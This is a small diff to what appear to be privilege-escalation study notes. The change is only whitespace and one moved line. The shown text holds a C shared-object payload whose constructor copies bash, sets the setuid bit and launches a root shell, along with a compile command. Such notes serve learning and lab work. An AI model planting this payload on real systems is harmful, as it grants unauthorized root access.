@@ -105,7 +105,7 @@ look for 'no such file or directory'
 if we have a read write access to one of those folders
 we can make a malicious payload that gets executed
 
- ```
+```
  nano libcalc.c
 
 #include <stdio.h>
@@ -116,13 +116,15 @@ static void inject() __attribute__((constructor));
 void inject(){
 	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
+
 ```
+
 
 ```
 gcc -shared -fPIC -o /home/user/.....
 ```
-look in ld_preload for explanation
 
+look in ld_preload for explanation
 
 ## binary symlinks
 
